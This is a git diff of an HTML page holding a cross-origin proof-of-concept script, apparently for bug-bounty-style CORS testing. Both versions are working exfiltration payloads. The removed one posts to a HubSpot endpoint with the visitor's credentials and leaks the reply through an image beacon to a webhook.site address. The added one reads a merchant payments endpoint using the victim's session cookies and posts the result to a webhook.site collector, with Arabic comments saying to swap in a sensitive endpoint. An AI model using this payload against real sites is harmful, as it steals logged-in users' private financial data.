@@ -1,21 +1,33 @@
 <html>
   <body>
     <script>
-      fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=oauth-ui", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "text/plain;charset=UTF-8"
-        },
-        body: JSON.stringify({ message: "CORS PoC" })
-      })
-      .then(response => response.text())
-      .then(data => {
-        // Send data via GET query string to bypass CORS
-        const img = document.createElement("img");
-        img.src = `https://webhook.site/deb5b7d2-f9fe-49a6-88dc-924b1bd807efe?leak=${encodeURIComponent(data)}`;
-        document.body.appendChild(img);
-      });
+      (async () => {
+  const target = "/v1/merchants-portal/list/payments";  // غيره حسب endpoint الحساس
+
+  const response = await fetch(target, {
+    method: "GET",
+    mode: "cors",
+    credentials: "include" // ده بيخلي الكوكيز/الجلسة تتبعت من المتصفح
+  });
+
+  const result = await response.text();
+
+  // ابعته إلى webhook بتاعك (مثلاً على webhook.site)
+  fetch("https://webhook.site/b22a9114-c3b8-4f5e-a385-b2c865ac2421", {
+    method: "POST",
+    body: JSON.stringify({
+      data: result,
+      origin: location.origin,
+      timestamp: new Date().toISOString()
+    }),
+    headers: {
+      "Content-Type": "application/json"
+    }
+  });
+
+  // لعرض مباشر في console
+  console.log("Leaked response:", result);
+})();
     </script>
   </body>
 </html>
